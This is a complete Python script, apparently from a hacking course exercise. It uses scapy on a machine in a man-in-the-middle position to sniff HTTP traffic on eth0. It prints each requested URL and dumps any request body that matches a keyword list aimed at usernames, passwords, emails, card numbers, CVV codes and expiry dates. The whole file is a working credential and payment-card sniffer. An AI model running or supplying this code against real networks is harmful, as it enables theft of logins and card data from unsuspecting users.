#! /usr/bin/env python3

# when we're MITM we sniff packets that goes through our interface (eth0)

import scapy.all as scapy
# import scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # scapy.sniff(iface=interface, store=False, prn=lambda x: x.show())


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # load = load.decode(encoding='unicode')   # interesuet pole/peremennaya LOAD v sloe Raw
        # keywords = ['username', 'user', 'uname', 'login', 'password', 'pass']
        keywords = [
            "log",
            "pwd",
            "username",
            "user",
            "password",
            "pass",
            "email",
            "cvc",
            "cvv",
            "card",
            "ccname",
            "cardnumber",
            "cc-exp",
            "name",
            "phone"
        ]

        for kwd in keywords:
            if kwd in str(load):
                return load
        return False


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username / password > " + str(login_info) + "\n\n")


sniff("eth0")
